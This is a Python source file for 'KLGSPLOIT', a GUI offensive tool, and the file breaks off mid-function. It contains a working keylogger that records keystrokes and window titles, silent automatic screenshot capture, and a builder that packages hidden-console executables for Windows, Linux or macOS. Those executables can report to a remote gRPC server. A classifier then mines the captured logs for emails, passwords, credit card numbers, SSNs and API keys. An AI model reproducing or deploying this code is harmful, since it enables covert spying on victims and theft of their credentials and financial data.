#!/usr/bin/env python3
"""
klgsploit_gui.py - GUI Offensive Tool

Graphical interface for:
- Keylogging with timestamps and window titles
- Screenshot capture
- Executable generation
- Log analysis and classification
"""

import os
import sys
import threading
import time
import platform
import subprocess
import tempfile
import shutil
import json
import re
from datetime import datetime
from collections import Counter

# Tkinter imports
import tkinter as tk
from tkinter import filedialog, StringVar, BooleanVar, IntVar, END, BOTH, YES, X, LEFT, RIGHT

# Check for ttkbootstrap
try:
    import ttkbootstrap as ttk
    from ttkbootstrap.constants import *
    from ttkbootstrap.dialogs import Messagebox
    HAS_TTK_BOOTSTRAP = True
except ImportError:
    from tkinter import ttk
    from tkinter import messagebox
    HAS_TTK_BOOTSTRAP = False
    print("[!] ttkbootstrap not found, using standard tkinter")
    print("[!] Install with: pip install ttkbootstrap")

# Check for pynput
try:
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False
    print("[!] pynput not found. Install with: pip install pynput")

# Check for PIL/mss
try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False


# Platform-specific window title detection
def get_active_window_title():
    """Get the title of the currently active window."""
    system = platform.system()
    
    if system == "Windows":
        try:
            import ctypes
            user32 = ctypes.windll.user32
            h_wnd = user32.GetForegroundWindow()
            length = user32.GetWindowTextLengthW(h_wnd)
            buf = ctypes.create_unicode_buffer(length + 1)
            user32.GetWindowTextW(h_wnd, buf, length + 1)
            title = buf.value
            if not title or title == "Program Manager":
                return "Desktop"
            return title
        except Exception:
            return "Desktop"
    
    elif system == "Linux":
        try:
            from Xlib import display, X
            d = display.Display()
            root = d.screen().root
            NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
            prop = root.get_full_property(NET_ACTIVE_WINDOW, X.AnyPropertyType)
            if not prop:
                return "Desktop"
            win_id = prop.value[0]
            if win_id == 0:
                return "Desktop"
            window = d.create_resource_object('window', win_id)
            NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
            wm_name_prop = window.get_full_property(NET_WM_NAME, X.AnyPropertyType)
            if wm_name_prop:
                name = wm_name_prop.value
                if isinstance(name, bytes):
                    return name.decode('utf-8', errors='ignore')
                return str(name)
            wm_name = window.get_wm_name()
            return wm_name if wm_name else "Desktop"
        except Exception:
            return "Desktop"
    
    elif system == "Darwin":
        try:
            from AppKit import NSWorkspace
            active_app = NSWorkspace.sharedWorkspace().activeApplication()
            app_name = active_app.get('NSApplicationName')
            return app_name if app_name else "Desktop"
        except Exception:
            return "Desktop"
    
    return "Desktop"


class KlgsploitGUI:
    def __init__(self):
        # Create window
        if HAS_TTK_BOOTSTRAP:
            self.app = ttk.Window(themename="superhero")
        else:
            self.app = tk.Tk()

        self.app.title("KLGSPLOIT - Advanced System Logger")
        self.app.geometry("1000x750")
        self.app.minsize(900, 650)

        # State variables
        self.keylogger_running = False
        self.keylogger_listener = None
        self.screenshot_thread = None
        self.screenshot_running = False
        self.last_window_title = ""
        self.grpc_server_running = False

        # Control variables
        self.var_status = StringVar(value="⚪ Stopped")
        self.var_output_file = StringVar(value="keylog.txt")
        self.var_timestamp = BooleanVar(value=True)
        self.var_window_title = BooleanVar(value=True)
        self.var_screenshot = BooleanVar(value=False)
        self.var_screenshot_interval = IntVar(value=60)
        self.var_screenshot_folder = StringVar(value="screenshots")
        self.var_screenshot_on_change = BooleanVar(value=False)
        self.var_grpc_server = StringVar(value="")
        self.var_grpc_port = IntVar(value=50051)

        # Exe generation variables
        self.var_exe_name = StringVar(value="keylogger")
        self.var_exe_os = StringVar(value=self._detect_os())
        self.var_exe_onefile = BooleanVar(value=True)
        self.var_exe_noconsole = BooleanVar(value=True)
        self.var_exe_icon = StringVar(value="")
        self.var_exe_timestamp = BooleanVar(value=True)
        self.var_exe_window = BooleanVar(value=True)
        self.var_exe_screenshot = BooleanVar(value=False)
        self.var_exe_screenshot_interval = IntVar(value=60)
        self.var_exe_grpc = StringVar(value="")

        # Classify variables
        self.var_classify_file = StringVar(value="keylog.txt")

        # Build UI
        self._build_ui()

    def _detect_os(self):
        if sys.platform.startswith('win'):
            return 'win'
        elif sys.platform.startswith('linux'):
            return 'lnx'
        elif sys.platform.startswith('darwin'):
            return 'mac'
        return 'lnx'

    def _build_ui(self):
        """Build the main user interface."""
        # Header
        header = ttk.Frame(self.app, padding=10)
        header.pack(fill=X)
        
        title_label = ttk.Label(header, text="🔐 KLGSPLOIT", font=("Segoe UI", 24, "bold"))
        title_label.pack(side=LEFT)
        
        status_label = ttk.Label(header, textvariable=self.var_status, font=("Consolas", 14))
        status_label.pack(side=RIGHT)

        # Notebook (tabs)
        if HAS_TTK_BOOTSTRAP:
            self.notebook = ttk.Notebook(self.app, bootstyle="primary")
        else:
            self.notebook = ttk.Notebook(self.app)
        self.notebook.pack(fill=BOTH, expand=YES, padx=10, pady=10)

        # Build all tabs
        self._build_keylogger_tab()
        self._build_screenshot_tab()
        self._build_genexe_tab()
        self._build_classify_tab()
        self._build_viewer_tab()
        self._build_grpc_tab()

    def _build_keylogger_tab(self):
        """Build the keylogger control tab."""
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text=" 🎮 Keylogger ")

        # Status frame
        if HAS_TTK_BOOTSTRAP:
            status_frame = ttk.Labelframe(tab, text="Status", padding=15, bootstyle="info")
        else:
            status_frame = ttk.LabelFrame(tab, text="Status", padding=15)
        status_frame.pack(fill=X, pady=10)

        self.lbl_status = ttk.Label(status_frame, textvariable=self.var_status, font=("Consolas", 18, "bold"))
        self.lbl_status.pack(pady=10)

        # Control buttons
        btn_frame = ttk.Frame(status_frame)
        btn_frame.pack(pady=10)

        if HAS_TTK_BOOTSTRAP:
            self.btn_start = ttk.Button(btn_frame, text="▶ Start Keylogger", command=self._toggle_keylogger,
                                        bootstyle="success", width=20)
        else:
            self.btn_start = ttk.Button(btn_frame, text="▶ Start Keylogger", command=self._toggle_keylogger, width=20)
        self.btn_start.pack(side=LEFT, padx=5)

        # Options frame
        if HAS_TTK_BOOTSTRAP:
            options_frame = ttk.Labelframe(tab, text="Options", padding=15, bootstyle="secondary")
        else:
            options_frame = ttk.LabelFrame(tab, text="Options", padding=15)
        options_frame.pack(fill=X, pady=10)

        # Output file
        row1 = ttk.Frame(options_frame)
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Output File:", width=15).pack(side=LEFT)
        ttk.Entry(row1, textvariable=self.var_output_file, width=40).pack(side=LEFT, padx=5)
        ttk.Button(row1, text="Browse", command=self._browse_output).pack(side=LEFT)

        # Checkboxes
        row2 = ttk.Frame(options_frame)
        row2.pack(fill=X, pady=5)
        if HAS_TTK_BOOTSTRAP:
            ttk.Checkbutton(row2, text="Enable Timestamps", variable=self.var_timestamp,
                            bootstyle="round-toggle").pack(side=LEFT, padx=10)
            ttk.Checkbutton(row2, text="Log Window Titles", variable=self.var_window_title,
                            bootstyle="round-toggle").pack(side=LEFT, padx=10)
        else:
            ttk.Checkbutton(row2, text="Enable Timestamps", variable=self.var_timestamp).pack(side=LEFT, padx=10)
            ttk.Checkbutton(row2, text="Log Window Titles", variable=self.var_window_title).pack(side=LEFT, padx=10)

        # gRPC
        row3 = ttk.Frame(options_frame)
        row3.pack(fill=X, pady=5)
        ttk.Label(row3, text="gRPC Server:", width=15).pack(side=LEFT)
        ttk.Entry(row3, textvariable=self.var_grpc_server, width=30).pack(side=LEFT, padx=5)
        ttk.Label(row3, text="(leave empty to disable)").pack(side=LEFT)

        # Info
        if HAS_TTK_BOOTSTRAP:
            info_frame = ttk.Labelframe(tab, text="Info", padding=15, bootstyle="warning")
        else:
            info_frame = ttk.LabelFrame(tab, text="Info", padding=15)
        info_frame.pack(fill=X, pady=10)
        ttk.Label(info_frame, text="⚠️ Press ESC to stop the keylogger when running.").pack()
        ttk.Label(info_frame, text=f"📍 Detected OS: {platform.system()} ({self._detect_os()})").pack()
        
        deps_text = f"📦 Dependencies: pynput={'✓' if HAS_PYNPUT else '✗'}, PIL={'✓' if HAS_PIL else '✗'}, mss={'✓' if HAS_MSS else '✗'}"
        ttk.Label(info_frame, text=deps_text).pack()

    def _build_screenshot_tab(self):
        """Build the screenshot control tab."""
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text=" 📸 Screenshots ")

        # Manual capture
        if HAS_TTK_BOOTSTRAP:
            manual_frame = ttk.Labelframe(tab, text="Manual Capture", padding=15, bootstyle="info")
        else:
            manual_frame = ttk.LabelFrame(tab, text="Manual Capture", padding=15)
        manual_frame.pack(fill=X, pady=10)

        if HAS_TTK_BOOTSTRAP:
            ttk.Button(manual_frame, text="📸 Take Screenshot Now", command=self._take_screenshot,
                       bootstyle="warning", width=25).pack(pady=10)
        else:
            ttk.Button(manual_frame, text="📸 Take Screenshot Now", command=self._take_screenshot, width=25).pack(pady=10)

        # Auto capture
        if HAS_TTK_BOOTSTRAP:
            auto_frame = ttk.Labelframe(tab, text="Automatic Capture", padding=15, bootstyle="secondary")
        else:
            auto_frame = ttk.LabelFrame(tab, text="Automatic Capture", padding=15)
        auto_frame.pack(fill=X, pady=10)

        row1 = ttk.Frame(auto_frame)
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Output Folder:", width=15).pack(side=LEFT)
        ttk.Entry(row1, textvariable=self.var_screenshot_folder, width=30).pack(side=LEFT, padx=5)
        ttk.Button(row1, text="Browse", command=self._browse_screenshot_folder).pack(side=LEFT)

        row2 = ttk.Frame(auto_frame)
        row2.pack(fill=X, pady=5)
        ttk.Label(row2, text="Interval (sec):", width=15).pack(side=LEFT)
        ttk.Spinbox(row2, from_=5, to=3600, textvariable=self.var_screenshot_interval, width=10).pack(side=LEFT, padx=5)

        row3 = ttk.Frame(auto_frame)
        row3.pack(fill=X, pady=5)
        if HAS_TTK_BOOTSTRAP:
            ttk.Checkbutton(row3, text="Screenshot on Window Change (instead of interval)",
                            variable=self.var_screenshot_on_change, bootstyle="round-toggle").pack(side=LEFT)
        else:
            ttk.Checkbutton(row3, text="Screenshot on Window Change", variable=self.var_screenshot_on_change).pack(side=LEFT)

        row4 = ttk.Frame(auto_frame)
        row4.pack(fill=X, pady=10)
        if HAS_TTK_BOOTSTRAP:
            self.btn_auto_screenshot = ttk.Button(row4, text="▶ Start Auto Screenshot",
                                                   command=self._toggle_auto_screenshot, bootstyle="success", width=25)
        else:
            self.btn_auto_screenshot = ttk.Button(row4, text="▶ Start Auto Screenshot",
                                                   command=self._toggle_auto_screenshot, width=25)
        self.btn_auto_screenshot.pack()

    def _build_genexe_tab(self):
        """Build the executable generation tab."""
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text=" 🔧 Generate EXE ")

        # Basic settings
        if HAS_TTK_BOOTSTRAP:
            basic_frame = ttk.Labelframe(tab, text="Basic Settings", padding=15, bootstyle="info")
        else:
            basic_frame = ttk.LabelFrame(tab, text="Basic Settings", padding=15)
        basic_frame.pack(fill=X, pady=10)

        row1 = ttk.Frame(basic_frame)
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Executable Name:", width=18).pack(side=LEFT)
        ttk.Entry(row1, textvariable=self.var_exe_name, width=30).pack(side=LEFT, padx=5)

        row2 = ttk.Frame(basic_frame)
        row2.pack(fill=X, pady=5)
        ttk.Label(row2, text="Target OS:", width=18).pack(side=LEFT)
        if HAS_TTK_BOOTSTRAP:
            ttk.Radiobutton(row2, text="Windows", variable=self.var_exe_os, value="win", bootstyle="toolbutton").pack(side=LEFT, padx=5)
            ttk.Radiobutton(row2, text="Linux", variable=self.var_exe_os, value="lnx", bootstyle="toolbutton").pack(side=LEFT, padx=5)
            ttk.Radiobutton(row2, text="macOS", variable=self.var_exe_os, value="mac", bootstyle="toolbutton").pack(side=LEFT, padx=5)
        else:
            ttk.Radiobutton(row2, text="Windows", variable=self.var_exe_os, value="win").pack(side=LEFT, padx=5)
            ttk.Radiobutton(row2, text="Linux", variable=self.var_exe_os, value="lnx").pack(side=LEFT, padx=5)
            ttk.Radiobutton(row2, text="macOS", variable=self.var_exe_os, value="mac").pack(side=LEFT, padx=5)

        row3 = ttk.Frame(basic_frame)
        row3.pack(fill=X, pady=5)
        if HAS_TTK_BOOTSTRAP:
            ttk.Checkbutton(row3, text="Single File (--onefile)", variable=self.var_exe_onefile,
                            bootstyle="round-toggle").pack(side=LEFT, padx=10)
            ttk.Checkbutton(row3, text="Hide Console (--noconsole)", variable=self.var_exe_noconsole,
                            bootstyle="round-toggle").pack(side=LEFT, padx=10)
        else:
            ttk.Checkbutton(row3, text="Single File", variable=self.var_exe_onefile).pack(side=LEFT, padx=10)
            ttk.Checkbutton(row3, text="Hide Console", variable=self.var_exe_noconsole).pack(side=LEFT, padx=10)

        row4 = ttk.Frame(basic_frame)
        row4.pack(fill=X, pady=5)
        ttk.Label(row4, text="Icon File:", width=18).pack(side=LEFT)
        ttk.Entry(row4, textvariable=self.var_exe_icon, width=30).pack(side=LEFT, padx=5)
        ttk.Button(row4, text="Browse", command=self._browse_icon).pack(side=LEFT)

        # Features
        if HAS_TTK_BOOTSTRAP:
            features_frame = ttk.Labelframe(tab, text="Features to Include", padding=15, bootstyle="secondary")
        else:
            features_frame = ttk.LabelFrame(tab, text="Features to Include", padding=15)
        features_frame.pack(fill=X, pady=10)

        row5 = ttk.Frame(features_frame)
        row5.pack(fill=X, pady=5)
        if HAS_TTK_BOOTSTRAP:
            ttk.Checkbutton(row5, text="Timestamps", variable=self.var_exe_timestamp,
                            bootstyle="round-toggle").pack(side=LEFT, padx=10)
            ttk.Checkbutton(row5, text="Window Titles", variable=self.var_exe_window,
                            bootstyle="round-toggle").pack(side=LEFT, padx=10)
            ttk.Checkbutton(row5, text="Screenshots", variable=self.var_exe_screenshot,
                            bootstyle="round-toggle").pack(side=LEFT, padx=10)
        else:
            ttk.Checkbutton(row5, text="Timestamps", variable=self.var_exe_timestamp).pack(side=LEFT, padx=10)
            ttk.Checkbutton(row5, text="Window Titles", variable=self.var_exe_window).pack(side=LEFT, padx=10)
            ttk.Checkbutton(row5, text="Screenshots", variable=self.var_exe_screenshot).pack(side=LEFT, padx=10)

        row6 = ttk.Frame(features_frame)
        row6.pack(fill=X, pady=5)
        ttk.Label(row6, text="Screenshot Interval:", width=18).pack(side=LEFT)
        ttk.Spinbox(row6, from_=5, to=3600, textvariable=self.var_exe_screenshot_interval, width=10).pack(side=LEFT, padx=5)
        ttk.Label(row6, text="seconds").pack(side=LEFT)

        row7 = ttk.Frame(features_frame)
        row7.pack(fill=X, pady=5)
        ttk.Label(row7, text="gRPC Server:", width=18).pack(side=LEFT)
        ttk.Entry(row7, textvariable=self.var_exe_grpc, width=30).pack(side=LEFT, padx=5)
        ttk.Label(row7, text="(host:port or leave empty)").pack(side=LEFT)

        # Generate button
        btn_frame = ttk.Frame(tab)
        btn_frame.pack(fill=X, pady=20)
        if HAS_TTK_BOOTSTRAP:
            ttk.Button(btn_frame, text="🔨 Generate Executable", command=self._generate_executable,
                       bootstyle="success", width=25).pack()
        else:
            ttk.Button(btn_frame, text="🔨 Generate Executable", command=self._generate_executable, width=25).pack()

        # Output
        if HAS_TTK_BOOTSTRAP:
            output_frame = ttk.Labelframe(tab, text="Output", padding=10, bootstyle="dark")
        else:
            output_frame = ttk.LabelFrame(tab, text="Output", padding=10)
        output_frame.pack(fill=BOTH, expand=YES, pady=10)

        self.txt_genexe_output = tk.Text(output_frame, height=8, font=("Consolas", 10))
        self.txt_genexe_output.pack(fill=BOTH, expand=YES)

    def _build_classify_tab(self):
        """Build the log classification tab."""
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text=" 🔍 Classify ")

        # Input
        if HAS_TTK_BOOTSTRAP:
            input_frame = ttk.Labelframe(tab, text="Input File", padding=15, bootstyle="info")
        else:
            input_frame = ttk.LabelFrame(tab, text="Input File", padding=15)
        input_frame.pack(fill=X, pady=10)

        row1 = ttk.Frame(input_frame)
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Log File:", width=12).pack(side=LEFT)
        ttk.Entry(row1, textvariable=self.var_classify_file, width=40).pack(side=LEFT, padx=5)
        ttk.Button(row1, text="Browse", command=self._browse_classify_file).pack(side=LEFT)

        row2 = ttk.Frame(input_frame)
        row2.pack(fill=X, pady=10)
        if HAS_TTK_BOOTSTRAP:
            ttk.Button(row2, text="🔍 Classify Emails & Passwords", command=self._classify_log,
                       bootstyle="primary", width=30).pack()
        else:
            ttk.Button(row2, text="🔍 Classify Emails & Passwords", command=self._classify_log, width=30).pack()

        # Results
        if HAS_TTK_BOOTSTRAP:
            results_frame = ttk.Labelframe(tab, text="Results", padding=10, bootstyle="secondary")
        else:
            results_frame = ttk.LabelFrame(tab, text="Results", padding=10)
        results_frame.pack(fill=BOTH, expand=YES, pady=10)

        self.txt_classify_output = tk.Text(results_frame, height=20, font=("Consolas", 10))
        self.txt_classify_output.pack(fill=BOTH, expand=YES)

    def _build_viewer_tab(self):
        """Build the log viewer tab."""
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text=" 📄 Log Viewer ")

        # Controls
        ctrl_frame = ttk.Frame(tab)
        ctrl_frame.pack(fill=X, pady=5)
        if HAS_TTK_BOOTSTRAP:
            ttk.Button(ctrl_frame, text="🔄 Refresh", command=self._refresh_log, bootstyle="info").pack(side=LEFT, padx=5)
            ttk.Button(ctrl_frame, text="🗑️ Clear Log File", command=self._clear_log, bootstyle="danger").pack(side=LEFT, padx=5)
        else:
            ttk.Button(ctrl_frame, text="🔄 Refresh", command=self._refresh_log).pack(side=LEFT, padx=5)
            ttk.Button(ctrl_frame, text="🗑️ Clear Log File", command=self._clear_log).pack(side=LEFT, padx=5)

        # Text area with scrollbar
        viewer_frame = ttk.Frame(tab)
        viewer_frame.pack(fill=BOTH, expand=YES, pady=10)
        
        scrollbar = ttk.Scrollbar(viewer_frame)
        scrollbar.pack(side=RIGHT, fill='y')
        
        self.txt_log_viewer = tk.Text(viewer_frame, font=("Consolas", 10), yscrollcommand=scrollbar.set)
        self.txt_log_viewer.pack(fill=BOTH, expand=YES)
        scrollbar.config(command=self.txt_log_viewer.yview)

    def _build_grpc_tab(self):
        """Build the gRPC server tab."""
        tab = ttk.Frame(self.notebook, padding=20)
        self.notebook.add(tab, text=" 📡 gRPC Server ")

        # Server settings
        if HAS_TTK_BOOTSTRAP:
            server_frame = ttk.Labelframe(tab, text="Server Settings", padding=15, bootstyle="info")
        else:
            server_frame = ttk.LabelFrame(tab, text="Server Settings", padding=15)
        server_frame.pack(fill=X, pady=10)

        row1 = ttk.Frame(server_frame)
        row1.pack(fill=X, pady=5)
        ttk.Label(row1, text="Port:", width=12).pack(side=LEFT)
        ttk.Spinbox(row1, from_=1024, to=65535, textvariable=self.var_grpc_port, width=10).pack(side=LEFT, padx=5)

        row2 = ttk.Frame(server_frame)
        row2.pack(fill=X, pady=10)
        if HAS_TTK_BOOTSTRAP:
            self.btn_grpc_server = ttk.Button(row2, text="▶ Start gRPC Server",
                                               command=self._toggle_grpc_server, bootstyle="success", width=25)
        else:
            self.btn_grpc_server = ttk.Button(row2, text="▶ Start gRPC Server",
                                               command=self._toggle_grpc_server, width=25)
        self.btn_grpc_server.pack()

        # Log output
        if HAS_TTK_BOOTSTRAP:
            log_frame = ttk.Labelframe(tab, text="Received Logs", padding=10, bootstyle="secondary")
        else:
            log_frame = ttk.LabelFrame(tab, text="Received Logs", padding=10)
        log_frame.pack(fill=BOTH, expand=YES, pady=10)

        scrollbar = ttk.Scrollbar(log_frame)
        scrollbar.pack(side=RIGHT, fill='y')
        
        self.txt_grpc_log = tk.Text(log_frame, height=15, font=("Consolas", 10), yscrollcommand=scrollbar.set)
        self.txt_grpc_log.pack(fill=BOTH, expand=YES)
        scrollbar.config(command=self.txt_grpc_log.yview)

        # Info
        if HAS_TTK_BOOTSTRAP:
            info_frame = ttk.Labelframe(tab, text="Info", padding=10, bootstyle="warning")
        else:
            info_frame = ttk.LabelFrame(tab, text="Info", padding=10)
        info_frame.pack(fill=X, pady=10)
        ttk.Label(info_frame, text="⚠️ Requires grpcio and generated proto files").pack()
        ttk.Label(info_frame, text="Run: pip install grpcio grpcio-tools").pack()

    # ==================== Action Methods ====================

    def _browse_output(self):
        """Browse for output file."""
        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filepath:
            self.var_output_file.set(filepath)

    def _browse_screenshot_folder(self):
        """Browse for screenshot folder."""
        folder = filedialog.askdirectory()
        if folder:
            self.var_screenshot_folder.set(folder)

    def _browse_icon(self):
        """Browse for icon file."""
        filepath = filedialog.askopenfilename(
            filetypes=[("Icon files", "*.ico *.icns"), ("All files", "*.*")]
        )
        if filepath:
            self.var_exe_icon.set(filepath)

    def _browse_classify_file(self):
        """Browse for log file to classify."""
        filepath = filedialog.askopenfilename(
            filetypes=[("Text files", "*.txt"), ("Log files", "*.log"), ("All files", "*.*")]
        )
        if filepath:
            self.var_classify_file.set(filepath)

    def _toggle_keylogger(self):
        """Start or stop the keylogger."""
        if not HAS_PYNPUT:
            self._show_error("pynput not installed", "Please install pynput: pip install pynput")
            return

        if self.keylogger_running:
            self._stop_keylogger()
        else:
            self._start_keylogger()

    def _start_keylogger(self):
        """Start the keylogger."""
        self.keylogger_running = True
        self.var_status.set("🟢 Running")
        self.btn_start.config(text="⏹ Stop Keylogger")
        if HAS_TTK_BOOTSTRAP:
            self.btn_start.config(bootstyle="danger")

        def on_press(key):
            if not self.keylogger_running:
                return False
            
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            current_window = get_active_window_title() if self.var_window_title.get() else ""

            try:
                with open(self.var_output_file.get(), 'a', encoding='utf-8') as f:
                    # Log window change
                    if self.var_window_title.get() and current_window != self.last_window_title:
                        f.write(f'\n--- Window: [{current_window}] at {timestamp} ---\n')
                        self.last_window_title = current_window

                    # Log key
                    if hasattr(key, 'char') and key.char:
                        if self.var_timestamp.get():
                            f.write(f'[{timestamp}] Key: {key.char}\n')
                        else:
                            f.write(key.char)
                    else:
                        key_name = str(key).replace('Key.', '')
                        if key_name == 'space':
                            f.write(' ')
                        elif key_name == 'enter':
                            f.write('\n')
                        elif self.var_timestamp.get():
                            f.write(f'[{timestamp}] [{key_name}]\n')
                        else:
                            f.write(f'[{key_name}]')
            except Exception as e:
                print(f"Error: {e}")

        def on_release(key):
            if key == keyboard.Key.esc:
                self.app.after(0, self._stop_keylogger)
                return False
            return self.keylogger_running

        self.keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        self.keylogger_listener.start()

    def _stop_keylogger(self):
        """Stop the keylogger."""
        self.keylogger_running = False
        self.var_status.set("⚪ Stopped")
        self.btn_start.config(text="▶ Start Keylogger")
        if HAS_TTK_BOOTSTRAP:
            self.btn_start.config(bootstyle="success")
        
        if self.keylogger_listener:
            self.keylogger_listener.stop()
            self.keylogger_listener = None

    def _take_screenshot(self):
        """Take a single screenshot."""
        folder = self.var_screenshot_folder.get()
        os.makedirs(folder, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(folder, f"screenshot_{timestamp}.png")

        try:
            if HAS_PIL:
                screenshot = ImageGrab.grab()
                screenshot.save(filepath)
            elif HAS_MSS:
                with mss.mss() as sct:
                    sct.shot(mon=-1, output=filepath)
            else:
                self._show_error("No screenshot library", "Install PIL or mss: pip install pillow mss")
                return
            
            self._show_info("Screenshot Saved", f"Screenshot saved to:\n{filepath}")
        except Exception as e:
            self._show_error("Screenshot Error", str(e))

    def _toggle_auto_screenshot(self):
        """Toggle automatic screenshots."""
        if self.screenshot_running:
            self.screenshot_running = False
            self.btn_auto_screenshot.config(text="▶ Start Auto Screenshot")
            if HAS_TTK_BOOTSTRAP:
                self.btn_auto_screenshot.config(bootstyle="success")
        else:
            self.screenshot_running = True
            self.btn_auto_screenshot.config(text="⏹ Stop Auto Screenshot")
            if HAS_TTK_BOOTSTRAP:
                self.btn_auto_screenshot.config(bootstyle="danger")
            
            def screenshot_loop():
                while self.screenshot_running:
                    self._take_screenshot_silent()
                    time.sleep(self.var_screenshot_interval.get())
            
            self.screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
            self.screenshot_thread.start()

    def _take_screenshot_silent(self):
        """Take a screenshot without showing message."""
        folder = self.var_screenshot_folder.get()
        os.makedirs(folder, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(folder, f"screenshot_{timestamp}.png")

        try:
            if HAS_PIL:
                screenshot = ImageGrab.grab()
                screenshot.save(filepath)
            elif HAS_MSS:
                with mss.mss() as sct:
                    sct.shot(mon=-1, output=filepath)
        except Exception:
            pass

    def _generate_executable(self):
        """Generate executable using PyInstaller."""
        self.txt_genexe_output.delete(1.0, END)
        self.txt_genexe_output.insert(END, "[*] Starting executable generation...\n")
        self.app.update()

        def generate():
            try:
                # Import generator from CLI module
                script_dir = os.path.dirname(os.path.abspath(__file__))
                
                # Build config
                class Config:
                    output_file = 'keylog.txt'
                    timestamp_enabled = self.var_exe_timestamp.get()
                    window_title_enabled = self.var_exe_window.get()
                    screenshot_enabled = self.var_exe_screenshot.get()
                    screenshot_interval = self.var_exe_screenshot_interval.get()
                    screenshot_folder = 'screenshots'
                    screenshot_on_window_change = False
                    grpc_server = self.var_exe_grpc.get() or None
                    onefile = self.var_exe_onefile.get()
                    noconsole = self.var_exe_noconsole.get()
                    icon = self.var_exe_icon.get() or None
                    upx = False

                config = Config()
                target_os = self.var_exe_os.get()
                name = self.var_exe_name.get()

                # Generate script content
                from klgsploit_cli import generate_keylogger_script, generate_executable
                
                result = generate_executable(name, config, target_os)
                
                if result:
                    self.app.after(0, lambda: self.txt_genexe_output.insert(END, f"[+] Successfully generated: {name}\n"))
                else:
                    self.app.after(0, lambda: self.txt_genexe_output.insert(END, "[-] Generation failed\n"))

            except ImportError as e:
                self.app.after(0, lambda: self.txt_genexe_output.insert(END, f"[-] Import error: {e}\n"))
                self.app.after(0, lambda: self.txt_genexe_output.insert(END, "[*] Make sure klgsploit_cli.py is in the same directory\n"))
            except Exception as e:
                self.app.after(0, lambda: self.txt_genexe_output.insert(END, f"[-] Error: {e}\n"))

        threading.Thread(target=generate, daemon=True).start()

    def _classify_log(self):
        """Classify emails and passwords using the enhanced classifier"""
        filepath = self.var_classify_file.get()

        if not os.path.exists(filepath):
            self._show_error("File Not Found", f"File not found: {filepath}")
            return

        self.txt_classify_output.delete(1.0, END)
        self.txt_classify_output.insert(END, f"[*] Analyzing: {filepath}\n\n")

        try:
            # Import the new enhanced classifier
            from classifier import EnhancedClassifier

            # Read the file
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                text = f.read()

            # Create classifier (use_llm=True for AI, False for fast mode)
            classifier = EnhancedClassifier(use_llm=True)

            # Optional: attach console observer to see alerts in terminal
            # from classifier import ConsoleObserver
            # classifier.attach(ConsoleObserver())

            # Run the analysis
            result = classifier.classify_text(text)

            # Display emails
            self.txt_classify_output.insert(END, "=" * 50 + "\n")
            self.txt_classify_output.insert(END, f"📧 EMAILS FOUND: {len(result['emails'])}\n")
            self.txt_classify_output.insert(END, "=" * 50 + "\n")
            for item in result['emails'][:20]:  # Show top 20
                self.txt_classify_output.insert(END, f"  [{item['count']}x] {item['value']}\n")

            # Display passwords
            self.txt_classify_output.insert(END, "\n" + "=" * 50 + "\n")
            self.txt_classify_output.insert(END, f"🔑 PASSWORD CANDIDATES: {len(result['passwords'])}\n")
            self.txt_classify_output.insert(END, "=" * 50 + "\n")
            for item in result['passwords'][:20]:  # Show top 20
                self.txt_classify_output.insert(END, f"  [{item['count']}x] {item['value']}\n")

            # Display additional sensitive data
            sensitive = result['sensitive_data']
            if sensitive['credit_cards'] or sensitive['ssns'] or sensitive['api_keys']:
                self.txt_classify_output.insert(END, "\n" + "=" * 50 + "\n")
                self.txt_classify_output.insert(END, "💳 ADDITIONAL SENSITIVE DATA\n")
                self.txt_classify_output.insert(END, "=" * 50 + "\n")

                if sensitive['credit_cards']:
                    self.txt_classify_output.insert(END, f"Credit Cards: {len(sensitive['credit_cards'])}\n")
                    for cc in sensitive['credit_cards'][:5]:
                        self.txt_classify_output.insert(END, f"  - {cc}\n")

                if sensitive['ssns']:
                    self.txt_classify_output.insert(END, f"SSNs: {len(sensitive['ssns'])}\n")
                    for ssn in sensitive['ssns'][:5]:
                        self.txt_classify_output.insert(END, f"  - {ssn}\n")

                if sensitive['api_keys']:
                    self.txt_classify_output.insert(END, f"API Keys: {len(sensitive['api_keys'])}\n")
                    for key in sensitive['api_keys'][:5]:
                        self.txt_classify_output.insert(END, f"  - {key[:30]}...\n")

            # Display criticality assessment if available
            if result['criticality_assessment']:
                crit = result['criticality_assessment']
                self.txt_classify_output.insert(END, f"\n{'=' * 50}\n")
                self.txt_classify_output.insert(END, "🎯 CRITICALITY ASSESSMENT\n")
                self.txt_classify_output.insert(END, f"{'=' * 50}\n")
                self.txt_classify_output.insert(END, f"Level: {crit['criticality_level']}\n")
                self.txt_classify_output.insert(END, f"Confidence: {crit['confidence_score']:.0%}\n")
                self.txt_classify_output.insert(END, f"Rule-Based Score: {crit['rule_based_score']:.2f}\n")
                self.txt_classify_output.insert(END, f"AI Score: {crit['llm_score']:.2f}\n")
                self.txt_classify_output.insert(END, f"AI Reasoning: {crit['llm_reasoning']}\n")

                if crit['is_critical']:
                    self.txt_classify_output.insert(END, "\n⚠️  CRITICAL DATA DETECTED!\n")

            # Save detailed results to JSON
            output_path = filepath + '.classified.json'
